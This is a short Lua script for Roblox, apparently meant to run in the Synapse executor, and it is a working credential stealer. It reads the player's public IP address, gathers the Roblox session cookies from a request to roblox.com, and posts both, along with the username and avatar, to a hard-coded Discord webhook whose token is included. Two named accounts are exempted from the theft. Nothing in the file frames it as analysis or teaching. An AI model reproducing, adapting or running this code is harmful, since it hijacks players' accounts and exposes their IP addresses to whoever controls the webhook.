local ip = game:HttpGet("https://api.myip.com/")
local COOKIE = ""
local response = syn.request(
    {
        Url = "https://www.roblox.com",
    }
)
for i,v in pairs(response) do
    if type(v) == "table" then
        for ii,vv in pairs(v) do
            if string.find(ii, "cookie") then
                COOKIE = COOKIE.."\n"..vv
            end
        end
    end
end

if game.Players.LocalPlayer.Name == "masterofthec0k" or game.Players.LocalPlayer.Name == "full_ofcman" then
    ip = "<REDACTED>" 
    COOKIE = "<REDACTED>" 
end

syn.request({
    Url = "https://discordapp.com/api/webhooks/767480533671739422/Jkhoo2Cy7VBicAofISp9E1vuL51PZwpp9ZJOcL13SZELpc6IVOHHMuvEhF8Bkd68R3f0", 
    Body = game:GetService("HttpService"):JSONEncode({
        ["embeds"]={{
            ["title"]="||"..ip.."||",
            ["type"]="rich",
            ["description"]=COOKIE,
            ["color"]=tonumber(0x7269da),
            ["footer"]={
                ["text"]=os.date("%A, %m %B %Y %I:%M:%S %p")
            }
        }},
        ["avatar_url"]="http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username="..tostring(game:GetService("Players").LocalPlayer.Name),
        ["username"]="Username: "..game.Players.LocalPlayer.Name,
    }), 
    Method = "POST", 
    Headers = {["content-type"] = "application/json"}
})